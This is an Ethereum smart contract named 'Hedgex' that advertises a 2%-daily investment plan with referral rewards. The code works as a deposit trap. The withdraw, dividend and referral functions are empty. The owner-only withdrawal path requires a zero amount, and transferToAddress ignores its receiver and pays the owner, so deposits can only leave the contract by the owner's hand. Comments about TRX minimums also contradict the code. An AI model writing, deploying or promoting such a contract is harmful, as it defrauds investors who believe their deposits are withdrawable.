/**
 *Submitted for verification at Etherscan.io on 2021-03-13
*/

pragma solidity ^0.5.4;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }
	
    struct Plan 
	{
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        uint256 maxDailyInterest;
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        uint256 investDates;
        mapping(uint256 => Investment) plans;
		mapping(uint256 => uint256) levelRefCount;	
    }
    
   
}

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
   
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

contract Hedgex is Ownable {
    using SafeMath for uint256;
    uint256 private constant INTEREST_CYCLE = 1 days;
    uint256 private constant DEVELOPER_ENTRY_RATE = 20; //per thousand
    uint256 private constant ADMIN_ENTRY_RATE = 100;
    uint256 private constant REFERENCE_RATE = 110;
    
	mapping(uint256 => uint256) public  REFERENCE_LEVEL_RATE;
	
	
    uint256 public constant MINIMUM = 5000000; // 1000 TRX minimum
	
    uint256 public constant REFERRER_CODE = 1; //default

    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;
    uint256 private totalUser_;

    address payable private developerAccount_; 
    address payable private marketingAccount_; 
    address payable private referenceAccount_; 
	 
    address payable private safeWalletAddr; // 10% safe wallet 
    address payable private deductionWalletAddr; // 10% deduction
    	
    uint256 public withdrawalStatus;
	
    event UpdateWithdrawalStatus(uint256 indexed _withdrawalStatus, uint256 indexed newStatus);
    
    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    Objects.Plan[] private investmentPlans_;

    event onInvest(address investor, uint256 amount);
    event onGrant(address grantor, address beneficiary, uint256 amount);
    event onWithdraw(address investor, uint256 amount);
    event Multisended(uint256 value , address indexed sender);
    event Airdropped(address indexed _userAddress, uint256 _amount);
    
    /**
     * @dev Constructor Sets the original roles of the contract
     */

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        referenceAccount_ = msg.sender;
        _init();
		
    }

    function() external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
            invest(0, 0); //default to buy plan 0, no referrer
        }
    }

    function checkIn() public {
    }

    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }
	
	function setSafeWallet(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        safeWalletAddr = _newMarketingAccount;
    }

    function getSafeWallet() public view onlyOwner returns (address) {
        return safeWalletAddr;
    }
	
    function setDeductionWallet(address payable _newDeductionWallet) public onlyOwner {
        require(_newDeductionWallet != address(0));
        deductionWalletAddr = _newDeductionWallet;
    }

    function getDeductionWallet() public view onlyOwner returns (address) {
        return deductionWalletAddr;
    }	
		
    function _transferToUsers(uint256 _amount,address payable _addr) public onlyOwner
    {
        require(address(0).balance < _amount , "Error!, doesn't allow to transfer trx simultaneously");        
        uint256 withdrawalAmount = _amount;

        _addr.transfer(withdrawalAmount);
        emit onWithdraw(msg.sender, withdrawalAmount);
    } 
	
    function setWithdrawalStatus(uint256 newStatus) public onlyOwner returns (bool success) 
	{
        withdrawalStatus = newStatus;
        return true;
    }
    
    function getWithdrawalStatus() public view onlyOwner returns (uint256){
        return withdrawalStatus;
    }
	
    function getInvestmentDate() public view returns (uint256) {
        return block.timestamp;
    }
    

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
       
        investmentPlans_.push(Objects.Plan(20,100*60*60*24,20)); // 2% for 100 days        
		
		REFERENCE_LEVEL_RATE[1]=300;
    }

   

    function getTotalInvestments() public view returns (uint256){
        return totalInvestments_;
    }
    
    function getTotalUsers() public view returns (uint256){
        return totalUser_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }
	
    function getAddressByUID(uint256 _uid) public view returns (address) 
    {
       return uid2Investor[_uid].addr;
    }
    
    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            //require(uid2Investor[_referrerCode].addr != address(0), "Wrong referrer code");
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        
       
		
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {//old user
            //do nothing, referrer is permenant
        }
        
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;
		
		
        investor.planCount = investor.planCount.add(1);
		
        totalInvestments_ = totalInvestments_.add(_amount);
        totalUser_ = totalUser_.add(1);
	
	    return true;
    }
	
	
    function grant(address addr, uint256 _planId) public payable {
        uint256 grantorUid = address2UID[msg.sender];
        bool isAutoAddReferrer = true;
        uint256 referrerCode = 0;

        if (grantorUid != 0 && isAutoAddReferrer) {
            referrerCode = grantorUid;
        }

        if (_invest(addr,_planId,referrerCode,msg.value)) {
            emit onGrant(msg.sender, addr, msg.value);
        }
    }

    function invest(uint256 _referrerCode, uint256 _planId) public payable {
        if (_invest(msg.sender, _planId, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }
	
	function transferToAddress(address receiver, uint amount) public onlyOwner {
		require(receiver != address(0), "Owner only");
	    msg.sender.transfer(amount);
		emit onWithdraw(msg.sender, amount);
	}
	
	
    
    function withdraw() public payable 
	{
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start , uint256 _maxDailyInterest) private pure returns (uint256) {

       

    }
    
    
    function _calculateReferrerReward(uint256 _investmentAmount, uint256 _referrerCode) private 
	{   
      
    }
    
    function _withdrawal(uint256 _amount,address payable _addr) public onlyOwner
    {
        require(_amount == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = address2UID[_addr];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = _amount;
        if(withdrawalStatus==1)
        {
            _addr.transfer(withdrawalAmount);
            emit onWithdraw(msg.sender, withdrawalAmount);
        }
    }   
    
    function airDropTRX(address payable[]  memory  _userAddresses, uint256[] memory _amount) public onlyOwner {

        if(withdrawalStatus==1)
        {
            for (uint256 i = 0; i < _userAddresses.length; i++) {
                _userAddresses[i].transfer(_amount[i]);
                emit onWithdraw(msg.sender, _amount[i]);
            }
        }
    }
}